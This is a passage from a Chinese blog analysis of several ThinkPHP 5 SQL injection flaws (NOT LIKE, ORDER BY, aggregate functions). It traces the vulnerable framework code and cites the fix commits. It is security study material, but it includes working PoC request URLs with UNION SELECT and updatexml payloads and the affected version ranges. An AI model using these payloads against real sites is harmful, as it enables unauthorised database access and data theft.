方法处理后返回<code>$whereStr</code></p><p><code>parseWhereItem</code> 的 <code>where</code>  子单元函数方法调用，当操作符为<code>EXP</code> 时，经过拼接带入SQL查询，造成SQL注入。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>完整的方法调用如上图绿色部分。</p><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官网未修复。</p><blockquote><p>继承类，等面向对象的基本知识很重要。</p></blockquote><h1 id="SQL注入四-select"><a href="#SQL注入四-select" class="headerlink" title="SQL注入四(select)"></a>SQL注入四(select)</h1><p>漏洞复现环境和上面应该是差不多的。</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生</p></blockquote><p>在MySQL 中 <code>NOT LIKE</code>  为模糊查询，什么是模糊查询呢？</p><blockquote><p>mysql模糊查询like的用法:</p><p>查询user表中姓名中有“王”字的：</p><p>select * from user where name like ‘%王%’</p><p>mysql模糊查询not like的用法</p><p>查询user表中姓名中没有“王”字的：</p><p>select * from user where name not like ‘%王%’</p></blockquote><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该SQL注入漏洞影响版本为 <code>5.0.10</code> ，因此去 <code>5.0.11</code> 的更新记录中，则可以查看相关的修复操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ：<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>（ 急需如何快速定位到 某个指定的commit 记录的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>可以看到，这里之前是没有将特殊字符 <code>NOT LIKE</code>   给过滤掉。</p><hr><p>根据Payload来分析漏洞原理：</p><blockquote><p>不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法</p></blockquote><p>在<code>input</code> 方法中：传入的数据会经过 filterValue过滤<code>和 </code>强制类型转换,然后返回。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>跟进该方法，查看是如何实现的。发现又会调用到<code>filterExp</code>  方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>可以看到没有过滤<code>NOT LIKE</code></p><blockquote><p>ThinkPHP处理 <strong>SQL</strong> 语句的方法。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>此处的<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类。而<code>Mysql</code> 类继承于 <code>Builder</code>类，所以会继续调用到<code>Builder</code>类的<code>select</code>方法。该方法调用了<code>parseWhere</code>方法，然后调用了<code>buildWhere</code>方法，该方法继续调用了 <code>parseWhereItem</code> 方法，跟进该方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>此处到 操作符 <code>$exp</code> 为 <code>NOT LIKE</code> 或 <code>LIKE</code> 时，MySQL 的逻辑控制符可控。后进行拼接返回带入SQL语句中执行，导致了SQL注入漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>最终的结果就是返回带有恶意的SQL Payload（<code>whereStr</code>，红色部分。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>整个过程的方法调用情况如绿色框起的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-3"><a href="#利用总结-3" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>下图来自七月火师傅的总结文章里的。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>增加过滤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQL注入五-order-by"><a href="#SQL注入五-order-by" class="headerlink" title="SQL注入五(order by)"></a>SQL注入五(order by)</h1><p>环境搭建也差不多，需要手动开启<code>../config/app.php</code> 下的<code>app_debug</code> 和 <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <code>Builder</code> 类的 <code>parseOrder</code> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。</p><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>从修改记录中看到，增加了一条if判断语句来过滤<code>$key</code>中的<code>)</code> 和 <code>#</code>  。这两个符号也是在CTF中往往会过滤的点。</p><p>我们的数据都会进入到<code>Request</code> 类中的<code>input</code>方法，并且经过<code>filterValue</code>方法的过滤和强制类型转换并返回<code>$data</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>这里<code>array_walk_recursive()</code>函数，对数组中的成员递归调用<code>filterValue</code> 过滤函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>但是<code>filterValue</code> 过滤函数，不过滤数组的<code>key</code> ， 只过滤了数组的<code>value</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>用户输入的数据会原样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>进入框架的 SQL查询方法中，进入<code>Query</code>类，这次是通过调用<code>order</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>恶意Payload 未经过任何过滤直接传递给<code>options[&#39;order&#39;]</code> 中。接着调用<code>find()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>此处<code>$this-&gt;connection</code> 是<code>think/db/connectior/Mysql</code>类 ，继承于<code>Connection</code>类，于是此处继续调用该类的<code>find()</code>方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>该方法继续调用了 <code>$this-&gt;builder</code>, 即<code>think/db/builder/Mysql</code> 类的<code>select</code> 方法。该方法通过<code>str_replace</code> 函数，将数据填充到SQL语句中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用了<code>parseOrder</code> 方法，跟进下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的函数中，<code>$order</code> 即是我们输入的数据，然后经过了<code>parseKey</code> 方法处理后返回给<code>$array</code>。</p><p>跟进查看该方法的实现。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>该方法在变量<code>$key</code> 的两端添加了反引号进行拼接，并且没有任何过滤。再和精心构造好的Payload 结合后</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>最终返回了一个带有<code>ORDER BY</code> 的 SQL 注入 payload 给要执行的SQL语句，实现<code>ORDER BY</code> 注入。</p><h2 id="利用总结-4"><a href="#利用总结-4" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQL注入六-Mysql聚合函数注入"><a href="#SQL注入六-Mysql聚合函数注入" class="headerlink" title="SQL注入六(Mysql聚合函数注入)"></a>SQL注入六(Mysql聚合函数注入)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>这里以<code>5.1.25</code> 版本的ThinkPHP 进行漏洞分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和之前的分析思路一样，先去Github 上找更新版本的commit 记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>新增加了一条<code>if</code> 判断 语句，用来抛出异常。</p><p>和前几个ThinkPHP 5 SQL 注入漏洞一样，程序都会进入到<code>Query</code> 类中，此处在<code>../application/index/controller/index.php</code> 中，模拟的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此会先进入到<code>Query</code>类 的 <code>max</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>用户的输入传给了<code>field</code> ：id`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>然后该方法继续调用了<code>aggregate</code> 方法，该方法接着调用了<code>$this-&gt;connection</code> 的 <code>aggregate</code>方法，而<code>$this-&gt;connection</code> 为<code>think\db\connector\Mysql</code> 类，而<code>Mysql</code>类继承与<code>Connection</code> 类，故调用该类的<code>aggregate</code> 方法，该方法又调用了<code>$this-&gt;builder</code>，此处为<code>think\db\Builder\Mysql</code> 类的 <code>parseKey</code> 方法。该方法和SQL注入五起到的作用一样。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>理清了调用情况。具体说<code>parseKey</code>方法的作用</p><blockquote><p><strong>parseKey</strong> 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 <strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong> 方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong> 语句。这个方法应该说是在分析 <strong>ThinkPHP</strong> 漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到 <strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong> 方法，因为用户可控数据存储在 <strong>$options[‘field’]</strong> 变量中并被传入该方法。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>parseFieid</code>方法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// 支持 &#x27;field1&#x27;=&gt;&#x27;field2&#x27; 这样的字段别名定义</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法未做任何过滤，用户可控数据只是经过 <strong>parseKey</strong> 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p><h2 id="利用总结-5"><a href="#利用总结-5" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
